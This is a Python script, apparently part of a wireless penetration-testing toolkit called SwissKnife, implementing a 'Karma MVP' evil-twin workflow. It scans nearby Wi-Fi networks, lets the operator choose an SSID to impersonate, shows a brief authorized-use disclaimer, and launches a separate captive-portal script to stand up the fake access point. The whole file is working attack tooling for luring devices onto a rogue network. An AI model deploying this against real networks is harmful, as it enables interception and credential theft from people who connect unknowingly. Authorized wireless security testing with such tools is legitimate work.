#!/usr/bin/env python3

"""
Karma MVP workflow for SwissKnife.

This is a practical MVP implementation:
- discover nearby SSIDs,
- pick one SSID to impersonate,
- launch the existing captive portal stack with that SSID.
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
import logging
from typing import Dict, List, Optional

try:
    from core.wifi_iface import (
        get_interface_chipset as core_get_interface_chipset,
        get_interface_mode as core_get_interface_mode,
        list_network_interfaces as core_list_network_interfaces,
        set_interface_mode as core_set_interface_mode,
    )
except ModuleNotFoundError:
    MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
    PROJECT_ROOT = os.path.dirname(MODULE_DIR)
    if PROJECT_ROOT not in sys.path:
        sys.path.insert(0, PROJECT_ROOT)
    from core.wifi_iface import (
        get_interface_chipset as core_get_interface_chipset,
        get_interface_mode as core_get_interface_mode,
        list_network_interfaces as core_list_network_interfaces,
        set_interface_mode as core_set_interface_mode,
    )

logging.basicConfig(level=logging.INFO, format="%(message)s")

COLOR_ENABLED = sys.stdout.isatty()
COLOR_RESET = "\033[0m" if COLOR_ENABLED else ""
COLOR_HEADER = "\033[36m" if COLOR_ENABLED else ""
COLOR_HIGHLIGHT = "\033[35m" if COLOR_ENABLED else ""
COLOR_SUCCESS = "\033[32m" if COLOR_ENABLED else ""
COLOR_WARNING = "\033[33m" if COLOR_ENABLED else ""
STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""

MODULE_DIR = os.path.dirname(os.path.abspath(__file__))
PORTAL_SCRIPT = os.path.join(MODULE_DIR, "portal.py")
DEFAULT_SCAN_DURATION = 12
NMCLI_SCAN_TIMEOUT = 8.0
IW_SCAN_TIMEOUT = 8.0


def color_text(text: str, color: str) -> str:
    return f"{color}{text}{COLOR_RESET}" if color else text


def style(text: str, *styles: str) -> str:
    prefix = "".join(s for s in styles if s)
    return f"{prefix}{text}{COLOR_RESET}" if prefix else text


def tool_exists(tool: str) -> bool:
    return subprocess.run(
        ["which", tool],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    ).returncode == 0


def list_network_interfaces() -> List[str]:
    return core_list_network_interfaces()


def get_interface_chipset(interface: str) -> str:
    return core_get_interface_chipset(interface)


def get_interface_mode(interface: str) -> str:
    mode = core_get_interface_mode(interface, fallback_iwconfig=True, infer_monitor_suffix=True)
    return mode or "unknown"


def set_interface_mode(interface: str, mode: str) -> bool:
    ok, error = core_set_interface_mode(
        interface,
        mode,
        timeout_seconds=7.0,
        monitor_settle_seconds=2.0,
        managed_settle_seconds=1.0,
        enable_otherbss=(mode == "monitor"),
        fallback_iwconfig=True,
        infer_monitor_suffix=True,
    )
    if ok:
        return True
    logging.error("Failed to set %s mode on %s: %s", mode, interface, error or "unknown error")
    return False


def split_nmcli_escaped(line: str, expected: int) -> List[str]:
    fields: List[str] = []
    current: List[str] = []
    escape = False
    for char in line:
        if escape:
            current.append(char)
            escape = False
            continue
        if char == "\\":
            escape = True
            continue
        if char == ":" and len(fields) < expected - 1:
            fields.append("".join(current))
            current = []
            continue
        current.append(char)
    fields.append("".join(current))
    while len(fields) < expected:
        fields.append("")
    return fields[:expected]


def scan_ssids_nmcli(interface: str, timeout_seconds: int) -> List[Dict[str, Optional[float]]]:
    end_time = time.time() + max(3, timeout_seconds)
    by_bssid: Dict[str, Dict[str, Optional[float]]] = {}

    while time.time() < end_time:
        result = subprocess.run(
            [
                "nmcli",
                "-t",
                "-f",
                "SSID,BSSID,SIGNAL",
                "device",
                "wifi",
                "list",
                "ifname",
                interface,
                "--rescan",
                "yes",
            ],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            timeout=NMCLI_SCAN_TIMEOUT,
        )
        if result.returncode != 0:
            time.sleep(0.7)
            continue

        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            if not line:
                continue
            ssid_raw, bssid_raw, signal_raw = split_nmcli_escaped(line, 3)
            ssid = ssid_raw.strip()
            bssid = bssid_raw.strip().lower()
            if not ssid or not bssid:
                continue
            try:
                signal_val = float(signal_raw.strip())
            except ValueError:
                signal_val = None

            existing = by_bssid.get(bssid)
            if existing is None:
                by_bssid[bssid] = {"ssid": ssid, "bssid": bssid, "signal": signal_val}
            else:
                old_sig = existing.get("signal")
                if signal_val is not None and (old_sig is None or signal_val > old_sig):
                    existing["signal"] = signal_val
                    existing["ssid"] = ssid

        if by_bssid:
            break
        time.sleep(0.4)

    return sorted(
        by_bssid.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -1.0,
        reverse=True,
    )


def scan_ssids_iw(interface: str, timeout_seconds: int) -> List[Dict[str, Optional[float]]]:
    end_time = time.time() + max(3, timeout_seconds)
    by_bssid: Dict[str, Dict[str, Optional[float]]] = {}

    while time.time() < end_time:
        result = subprocess.run(
            ["iw", "dev", interface, "scan"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=False,
            timeout=IW_SCAN_TIMEOUT,
        )
        if result.returncode != 0:
            time.sleep(0.7)
            continue

        current: Dict[str, Optional[float]] = {"ssid": "", "bssid": "", "signal": None}

        def finalize_current() -> None:
            ssid = str(current.get("ssid") or "").strip()
            bssid = str(current.get("bssid") or "").strip()
            if not ssid or not bssid:
                return

            existing = by_bssid.get(bssid)
            signal_val = current.get("signal")
            if existing is None:
                by_bssid[bssid] = {"ssid": ssid, "bssid": bssid, "signal": signal_val}
                return

            old_sig = existing.get("signal")
            if signal_val is not None and (old_sig is None or signal_val > old_sig):
                existing["signal"] = signal_val
                existing["ssid"] = ssid

        for raw_line in result.stdout.splitlines():
            line = raw_line.strip()
            if line.startswith("BSS "):
                finalize_current()
                bssid = line.split()[1].split("(")[0].strip().lower()
                current = {"ssid": "", "bssid": bssid, "signal": None}
                continue
            if line.startswith("SSID:"):
                ssid = line.split(":", 1)[1].strip()
                current["ssid"] = ssid
                continue
            if line.startswith("signal:"):
                parts = line.split()
                try:
                    current["signal"] = float(parts[1])
                except (ValueError, IndexError):
                    current["signal"] = None
                continue

        finalize_current()

        if by_bssid:
            break
        time.sleep(0.4)

    return sorted(
        by_bssid.values(),
        key=lambda item: item["signal"] if item["signal"] is not None else -999.0,
        reverse=True,
    )


def discover_ssids(interface: str, duration_seconds: int) -> List[Dict[str, Optional[float]]]:
    logging.info("")
    logging.info(
        "Discovering SSIDs on %s (%ss)...",
        style(interface, COLOR_HIGHLIGHT, STYLE_BOLD),
        duration_seconds,
    )

    if tool_exists("nmcli"):
        results = scan_ssids_nmcli(interface, duration_seconds)
        if results:
            return results

    return scan_ssids_iw(interface, duration_seconds)


def select_interface(interfaces: List[str]) -> str:
    if not interfaces:
        logging.error("No network interfaces found.")
        sys.exit(1)

    logging.info(style("Available interfaces:", STYLE_BOLD))
    for index, name in enumerate(interfaces, start=1):
        chipset = get_interface_chipset(name)
        display_name = f"{name} (AP running)" if name == "wlan0" else name
        label = f"{index}) {display_name} -"
        logging.info("  %s %s", color_text(label, COLOR_HIGHLIGHT), chipset)

    while True:
        choice = input(f"{style('Select interface', STYLE_BOLD)} (number or name): ").strip()
        if not choice:
            logging.warning("Please select an interface.")
            continue
        if choice.isdigit():
            idx = int(choice)
            if 1 <= idx <= len(interfaces):
                return interfaces[idx - 1]
        if choice in interfaces:
            return choice
        logging.warning("Invalid selection. Try again.")


def prompt_int(prompt: str, default: int, minimum: int = 1) -> int:
    raw = input(prompt).strip()
    if not raw:
        return default
    try:
        value = int(raw)
    except ValueError:
        return default
    if value < minimum:
        return minimum
    return value


def prompt_manual_ssid() -> str:
    while True:
        ssid = input(f"{style('Enter SSID to impersonate', STYLE_BOLD)}: ").strip()
        if not ssid:
            logging.warning("SSID cannot be empty.")
            continue
        if len(ssid.encode("utf-8")) > 32:
            logging.warning("SSID is too long (max 32 bytes).")
            continue
        return ssid


def select_target_ssid(interface: str) -> Optional[str]:
    while True:
        logging.info("")
        scan_seconds = prompt_int(
            f"{style('Scan duration', STYLE_BOLD)} in seconds "
            f"({style('Enter', COLOR_SUCCESS, STYLE_BOLD)} for {DEFAULT_SCAN_DURATION}): ",
            default=DEFAULT_SCAN_DURATION,
        )

        logging.info("")
        input(
            f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to discover nearby SSIDs..."
        )

        networks = discover_ssids(interface, scan_seconds)
        if not networks:
            logging.warning("No SSIDs found.")
            choice = input(
                f"{style('Retry scan', STYLE_BOLD)} (Y), {style('Manual', STYLE_BOLD)} (M), "
                f"or {style('Exit', STYLE_BOLD)} (E): "
            ).strip().lower()
            if choice in {"m", "manual"}:
                return prompt_manual_ssid()
            if choice in {"e", "exit", "q", "quit"}:
                return None
            continue

        logging.info("")
        logging.info(style("Nearby SSIDs:", STYLE_BOLD))
        for index, network in enumerate(networks[:20], start=1):
            signal = network.get("signal")
            signal_text = f"{signal:.1f}" if signal is not None else "?"
            label = f"{index}) {network['ssid']} ({network['bssid']}) -"
            logging.info("  %s signal %s", color_text(label, COLOR_HIGHLIGHT), signal_text)

        selection = input(
            f"{style('Select SSID', STYLE_BOLD)} (number, R=rescan, M=manual, E=exit): "
        ).strip().lower()

        if selection in {"r", "rescan", ""}:
            continue
        if selection in {"m", "manual"}:
            return prompt_manual_ssid()
        if selection in {"e", "exit", "q", "quit"}:
            return None
        if selection.isdigit():
            idx = int(selection)
            if 1 <= idx <= min(20, len(networks)):
                return str(networks[idx - 1]["ssid"])
        logging.warning("Invalid selection.")


def disclaimer_confirmed(interface: str, ssid: str) -> bool:
    logging.info("")
    logging.info(style("Karma MVP disclaimer:", STYLE_BOLD))
    logging.info("This module should be used only for authorized security testing.")
    logging.info("Selected AP interface: %s", style(interface, COLOR_HIGHLIGHT, STYLE_BOLD))
    logging.info("Impersonated SSID: %s", style(ssid, COLOR_SUCCESS, STYLE_BOLD))
    choice = input(f"{style('Proceed', STYLE_BOLD)}? (Y/N): ").strip().lower()
    return choice == "y"


def launch_portal(interface: str, ssid: str) -> bool:
    if not os.path.isfile(PORTAL_SCRIPT):
        logging.error("Portal module not found: %s", PORTAL_SCRIPT)
        return False

    cmd = [
        sys.executable or "python3",
        PORTAL_SCRIPT,
        "--ap-interface",
        interface,
        "--scan-duration",
        "0",
        "--ap-ssid",
        ssid,
    ]

    logging.info("")
    logging.info(
        "%s launching captive portal workflow...",
        style("Karma MVP:", COLOR_SUCCESS, STYLE_BOLD),
    )
    result = subprocess.run(cmd, check=False)
    if result.returncode != 0:
        logging.error("Portal workflow exited with code %s.", result.returncode)
        return False
    return True


def run_karma_session() -> bool:
    interfaces = list_network_interfaces()
    interface = select_interface(interfaces)

    original_mode = get_interface_mode(interface)
    changed_mode = False

    try:
        if original_mode != "managed":
            logging.info("")
            input(
                f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to switch "
                f"{interface} to managed mode for SSID discovery..."
            )
            if not set_interface_mode(interface, "managed"):
                return False
            changed_mode = True
            logging.info(color_text("Managed mode confirmed.", COLOR_SUCCESS))

        target_ssid = select_target_ssid(interface)
        if target_ssid is None:
            logging.info("Aborted by user.")
            return False

        if not disclaimer_confirmed(interface, target_ssid):
            logging.info("Aborted by user.")
            return False

        logging.info("")
        input(
            f"{style('Press Enter', COLOR_SUCCESS, STYLE_BOLD)} to start Karma MVP for "
            f"{style(target_ssid, COLOR_SUCCESS, STYLE_BOLD)}..."
        )
        launch_portal(interface, target_ssid)
    finally:
        if changed_mode and original_mode == "monitor":
            logging.info("Restoring original monitor mode...")
            set_interface_mode(interface, "monitor")

    logging.info("")
    restart_choice = input(
        f"{style('Run another Karma MVP session', STYLE_BOLD)}? (Y/n): "
    ).strip().lower()
    return restart_choice in {"", "y", "yes"}


def main() -> None:
    logging.info(color_text("Karma MVP", COLOR_HEADER))
    logging.info("SSID impersonation helper (MVP) + captive portal workflow")
    logging.info("")

    if os.geteuid() != 0:
        logging.error("This script must be run as root!")
        sys.exit(1)

    required_tools = ["iw", "ip", "ethtool", "hostapd", "dnsmasq", "iptables"]
    missing = [tool for tool in required_tools if not tool_exists(tool)]
    if missing:
        logging.error("Missing required tools: %s", ", ".join(missing))
        sys.exit(1)

    while True:
        restart = run_karma_session()
        if not restart:
            break
        logging.info("")
        logging.info(color_text("Restarting Karma MVP...\n", COLOR_HEADER))


if __name__ == "__main__":
    main()
